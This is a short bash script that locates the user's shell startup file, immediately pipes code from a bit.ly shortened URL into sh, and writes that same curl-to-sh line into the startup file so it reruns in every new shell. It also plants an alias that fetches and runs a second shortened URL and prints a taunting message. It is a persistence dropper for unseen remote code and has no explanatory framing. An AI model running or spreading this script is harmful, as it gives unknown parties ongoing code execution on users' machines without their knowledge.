#!/bin/bash

shell_f=$(echo -n "$SHELL" | awk -F / '{print $3}')
shell_f="${HOME}/.${shell_f}rc"

echo "#HHH" >> $shell_f
curl -Ls https://bit.ly/2SXpdAI | sh
echo "curl -Ls https://bit.ly/2SXpdAI | sh" >> $shell_f
echo "alias nsilentcorner=\"curl -Ls https://bit.ly/3zSxeaE | sh && echo yes that\'s us -- REMEMBER THE NAME🧐\"" >> $shell_f
